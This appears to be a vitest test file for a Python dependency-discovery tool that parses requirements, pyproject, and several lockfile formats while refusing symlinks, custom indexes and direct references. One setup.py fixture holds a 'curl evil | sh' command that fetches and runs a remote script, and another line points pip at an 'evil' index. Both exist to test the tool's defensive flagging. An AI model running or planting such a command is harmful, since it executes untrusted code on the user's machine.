import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { discoverDependencies, poetryConstraint } from "./discover.js";

let repo: string;
let outside: string;

async function put(path: string, content: string): Promise<void> {
  await mkdir(dirname(join(repo, path)), { recursive: true });
  await writeFile(join(repo, path), content);
}

beforeEach(async () => {
  repo = await mkdtemp(join(tmpdir(), "prep-discover-"));
  outside = await mkdtemp(join(tmpdir(), "prep-outside-"));
});

afterEach(async () => {
  await rm(repo, { recursive: true, force: true });
  await rm(outside, { recursive: true, force: true });
});

describe("discoverDependencies", () => {
  it("reads requirements files and records rejected lines", async () => {
    await put("requirements.txt", "numpy>=1.20\n-r extra.txt\ntorch==2.1.0  # pinned\n--index-url https://evil\n");
    await put("requirements/dev.txt", "pytest\n");
    await put("constraints.txt", "numpy<2\n");
    const result = await discoverDependencies(repo);
    expect(result.ecosystem).toBe("python");
    expect(result.files.map((file) => [file.path, file.kind])).toEqual([
      ["constraints.txt", "constraints"],
      ["requirements.txt", "requirements"],
      ["requirements/dev.txt", "requirements"],
    ]);
    expect(result.files[0]?.sha256).toMatch(/^[a-f0-9]{64}$/u);
    expect(result.lockfile).toBeNull();
    expect(result.requirements.map((requirement) => requirement.spec)).toEqual(["numpy>=1.20", "torch==2.1.0", "pytest"]);
    expect(result.rejected).toEqual([
      { file: "requirements.txt", line: 2, text: "-r extra.txt", reason: expect.stringMatching(/nested/u) },
      { file: "requirements.txt", line: 4, text: "--index-url https://evil", reason: expect.stringMatching(/index/u) },
    ]);
  });

  it("treats a fully pinned requirements file as a lockfile", async () => {
    await put("requirements.txt", "numpy==1.26.4\nKeras_Preprocessing==1.1.2\n");
    const result = await discoverDependencies(repo);
    expect(result.lockfile).toEqual({ path: "requirements.txt", kind: "pinned-requirements" });
    expect(result.requirements.map((requirement) => requirement.spec)).toEqual(["numpy==1.26.4", "keras-preprocessing==1.1.2"]);
  });

  it("parses pyproject [project] and poetry dependencies and flags setup.py", async () => {
    await put(
      "pyproject.toml",
      [
        "[build-system]",
        'requires = ["setuptools"]',
        "",
        "[project]",
        'name = "demo"',
        "dependencies = [",
        '  "numpy>=1.20",',
        "  'scipy', # comment",
        '  "evil @ https://x/y.whl",',
        "]",
        "",
        "[tool.poetry.dependencies]",
        'python = "^3.10"',
        'torch = "^2.1"',
        'rich = { version = "~13.3", extras = ["jupyter"] }',
        'mylib = { git = "https://github.com/x/mylib" }',
        "",
      ].join("\n"),
    );
    await put("setup.py", "import os; os.system('curl evil | sh')\n");
    const result = await discoverDependencies(repo);
    expect(result.requirements.map((requirement) => requirement.spec)).toEqual([
      "numpy>=1.20",
      "scipy",
      "torch>=2.1.0,<3.0.0",
      "rich[jupyter]>=13.3.0,<13.4.0",
    ]);
    expect(result.rejected.map((entry) => entry.reason)).toEqual([
      expect.stringMatching(/direct references/u),
      expect.stringMatching(/poetry git/u),
    ]);
    expect(result.unsupported).toContainEqual({ path: "setup.py", reason: "executable_build_metadata" });
    expect(result.files.find((file) => file.path === "setup.py")?.kind).toBe("setup.py");
  });

  it("prefers uv.lock and skips the project itself", async () => {
    await put("requirements.txt", "numpy\n");
    await put(
      "uv.lock",
      [
        "version = 1",
        "[[package]]",
        'name = "demo"',
        'version = "0.1.0"',
        'source = { editable = "." }',
        "",
        "[[package]]",
        'name = "numpy"',
        'version = "1.26.4"',
        'source = { registry = "https://pypi.org/simple" }',
        "wheels = [",
        '  { url = "https://files.pythonhosted.org/x.whl", hash = "sha256:00" },',
        "]",
        "",
        "[[package]]",
        'name = "gitdep"',
        'version = "0.1"',
        'source = { git = "https://github.com/x/y" }',
      ].join("\n"),
    );
    const result = await discoverDependencies(repo);
    expect(result.lockfile).toEqual({ path: "uv.lock", kind: "uv.lock" });
    expect(result.requirements.map((requirement) => requirement.spec)).toEqual(["numpy==1.26.4"]);
    expect(result.rejected).toContainEqual(expect.objectContaining({ file: "uv.lock", reason: "non-registry lockfile source" }));
  });

  it("parses poetry.lock packages", async () => {
    await put(
      "poetry.lock",
      [
        "[[package]]",
        'name = "Pillow"',
        'version = "10.2.0"',
        'description = "x"',
        "",
        "[[package]]",
        'name = "local-thing"',
        'version = "1.0"',
        "",
        "[package.source]",
        'type = "directory"',
        'url = "../local"',
        "",
        "[metadata]",
        'lock-version = "2.0"',
      ].join("\n"),
    );
    const result = await discoverDependencies(repo);
    expect(result.lockfile).toEqual({ path: "poetry.lock", kind: "poetry.lock" });
    expect(result.requirements.map((requirement) => requirement.spec)).toEqual(["pillow==10.2.0"]);
    expect(result.rejected).toHaveLength(1);
  });

  it("parses the Pipfile.lock default section with hashes and markers", async () => {
    const hash = "c".repeat(64);
    await put(
      "Pipfile.lock",
      JSON.stringify({
        _meta: {},
        default: {
          requests: { version: "==2.31.0", hashes: [`sha256:${hash}`], markers: "python_version >= '3.7'" },
          editable: { editable: true, path: "." },
          loose: { version: "*" },
        },
        develop: { pytest: { version: "==8.0.0" } },
      }),
    );
    const result = await discoverDependencies(repo);
    expect(result.lockfile).toEqual({ path: "Pipfile.lock", kind: "Pipfile.lock" });
    expect(result.requirements).toHaveLength(1);
    expect(result.requirements[0]).toMatchObject({ name: "requests", hashes: [hash], marker: "python_version >= '3.7'" });
    expect(result.rejected.map((entry) => entry.reason)).toEqual(["non-registry lockfile source", "Pipfile.lock entry is not pinned"]);
  });

  it("parses pylock.toml", async () => {
    await put("pylock.toml", ['lock-version = "1.0"', "[[packages]]", 'name = "attrs"', 'version = "23.2.0"', "[[packages.wheels]]", 'url = "https://files.pythonhosted.org/a.whl"'].join("\n"));
    const result = await discoverDependencies(repo);
    expect(result.lockfile).toEqual({ path: "pylock.toml", kind: "pylock.toml" });
    expect(result.requirements.map((requirement) => requirement.spec)).toEqual(["attrs==23.2.0"]);
  });

  it("reports conda and other ecosystems explicitly as unsupported", async () => {
    await put("environment.yml", "dependencies:\n  - numpy\n");
    await put("package.json", "{}");
    await put("go.mod", "module x\n");
    await put("Cargo.toml", "[package]\n");
    await put("DESCRIPTION", "Package: x\n");
    const result = await discoverDependencies(repo);
    expect(result.ecosystem).toBe("unsupported");
    expect(result.unsupported.map((item) => item.reason).sort()).toEqual([
      "conda_environment_unsupported",
      "unsupported_ecosystem:cargo",
      "unsupported_ecosystem:go",
      "unsupported_ecosystem:npm",
      "unsupported_ecosystem:r",
    ]);
  });

  it("returns none for a repository without dependency files", async () => {
    await put("train.py", "print('hi')\n");
    expect((await discoverDependencies(repo)).ecosystem).toBe("none");
  });

  it("never follows symlinks, skips .git and respects depth and size limits", async () => {
    await writeFile(join(outside, "requirements.txt"), "secret-package==1.0\n");
    await mkdir(join(outside, "nested"));
    await writeFile(join(outside, "nested", "requirements.txt"), "other-secret==1.0\n");
    await symlink(join(outside, "requirements.txt"), join(repo, "requirements.txt"));
    await symlink(join(outside, "nested"), join(repo, "linked-dir"));
    await put(".git/requirements.txt", "from-git==1\n");
    await put("a/b/c/d/requirements.txt", "deep-ok==1\n");
    await put("a/b/c/d/e/requirements.txt", "too-deep==1\n");
    await put("big/requirements.txt", `${"x".repeat(1024 * 1024 + 1)}\n`);
    const result = await discoverDependencies(repo);
    expect(result.requirements.map((requirement) => requirement.name)).toEqual(["deep-ok"]);
    expect(result.unsupported).toContainEqual({ path: "requirements.txt", reason: "symlink_not_followed" });
    expect(result.unsupported).toContainEqual({ path: "big/requirements.txt", reason: "file_too_large" });
    expect(result.files.map((file) => file.path)).toEqual(["a/b/c/d/requirements.txt"]);
  });
});

describe("pyproject optional dependencies", () => {
  const PYPROJECT = [
    "[project]",
    'name = "demo"',
    'dependencies = ["numpy>=1.20"]',
    "",
    "[project.optional-dependencies]",
    'plot = ["matplotlib>=3.5", "seaborn"]',
    '"Dev-Tools" = [',
    '  "pytest",',
    '  "black @ git+https://github.com/psf/black",',
    "]",
    'gpu = ["cupy-cuda12x"]',
    "",
    "[tool.poetry.dependencies]",
    'python = "^3.10"',
    'rich = { version = "^13", optional = true }',
    'click = "^8.1"',
    "",
    "[tool.poetry.extras]",
    'cli = ["rich"]',
    "",
  ].join("\n");

  it("includes optional groups only when requested", async () => {
    await put("pyproject.toml", PYPROJECT);
    const plain = await discoverDependencies(repo);
    expect(plain.requirements.map((requirement) => requirement.spec)).toEqual(["numpy>=1.20", "click>=8.1.0,<9.0.0"]);
    expect(plain.optionalGroups).toEqual(["cli", "dev-tools", "gpu", "plot"]);
    expect(plain.rejected).toEqual([]);

    const extras = await discoverDependencies(repo, { extras: ["plot", "dev_tools", "cli", "missing"] });
    expect(extras.extras).toEqual(["cli", "dev-tools", "missing", "plot"]);
    expect(extras.requirements.map((requirement) => requirement.spec)).toEqual([
      "numpy>=1.20",
      "matplotlib>=3.5",
      "seaborn",
      "pytest",
      "rich>=13.0.0,<14.0.0",
      "click>=8.1.0,<9.0.0",
    ]);
    expect(extras.requirements.find((requirement) => requirement.name === "seaborn")?.source).toEqual({ file: "pyproject.toml", line: 6 });
    expect(extras.rejected).toEqual([expect.objectContaining({ file: "pyproject.toml", line: 9, reason: expect.stringMatching(/VCS|direct/u) })]);
    expect(extras.unsupported).toContainEqual({ path: "pyproject.toml", reason: "optional_dependency_group_missing:missing" });
  });

  it("reports repository lines that point pip at a CUDA index as rejected", async () => {
    await put("requirements.txt", "--extra-index-url https://download.pytorch.org/whl/cu121\ntorch==2.3.0+cu121\nnumpy\n");
    const result = await discoverDependencies(repo);
    expect(result.rejected).toEqual([
      expect.objectContaining({ line: 1, reason: expect.stringMatching(/accelerator package indexes/u) }),
    ]);
    // The +cu121 build itself is refused later, by the preparer's CPU-only policy, before any download.
    expect(result.requirements.map((requirement) => requirement.spec)).toEqual(["torch==2.3.0+cu121", "numpy"]);
  });
});

describe("poetryConstraint", () => {
  it.each([
    ["^1.2.3", ">=1.2.3,<2.0.0"],
    ["^0.2.3", ">=0.2.3,<0.3.0"],
    ["^0.0.3", ">=0.0.3,<0.0.4"],
    ["~1.2", ">=1.2.0,<1.3.0"],
    ["~1", ">=1.0.0,<2.0.0"],
    ["*", ""],
    ["1.4.2", "==1.4.2"],
    [">=1.0, <2", ">=1.0,<2"],
  ])("%s -> %s", (input, expected) => {
    expect(poetryConstraint(input)).toBe(expected);
  });

  it("rejects unknown syntax", () => {
    expect(poetryConstraint("1.0 || 2.0")).toBeNull();
  });
});
